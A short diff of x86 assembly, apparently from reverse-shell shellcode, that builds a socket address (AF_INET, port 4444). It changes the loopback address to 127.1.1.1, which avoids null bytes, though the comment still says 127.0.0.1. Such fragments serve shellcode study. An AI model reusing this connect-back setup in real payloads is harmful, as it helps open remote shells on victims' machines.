@@ -38,7 +38,7 @@ _start:
 	sub edx, edx
 	push edx		; NULL Terminator 
 
-	push 0x0100007f		;s_addr = 127.0.0.1
+	push 0x0101017f		;s_addr = 127.0.0.1
 	push word 0x5c11	; sin_port = 4444
 
 	push bx 		; AF_INET (2)
